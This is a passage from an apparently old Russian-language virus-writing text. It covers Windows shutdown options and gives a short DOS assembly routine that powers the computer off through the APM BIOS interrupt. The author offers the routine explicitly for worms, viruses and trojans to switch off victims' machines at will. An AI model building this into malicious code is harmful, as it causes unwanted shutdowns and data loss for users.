использовании данного ключа, Windows  не  информирует  запущенные
приложения о завершении работы, что ведет к потере данных. Поэто-
му, данный ключ нужно использовать осторожно.
  8 -  POWEROFF. Завершение работы Windows и выключение  питания.
Для использования этого ключа Ваша  система  должна  поддерживать
возможность автоматического выключения питания.

 А это для тех, кто пpогpаммиpyет на асме :

        model tiny
.code
        org   100h
start:
        mov   ax,05301h
        sub   bx,bx
        int   15h
        jb    l0120
        mov   ax,0530Eh
        sub   bx,bx
        mov   cx,00102h
        int   15h
        jb    l0120
        mov   ax,05307h
        mov   bx,00001h
        mov   cx,00003h
        int   15h
l0120:  int   20h
        ret
        end   start

   Таким обpазом Ваш чеpвь/виpyс/тpоян может выключать  компьютеp
когда емy вздyмается :)

                                      Helloween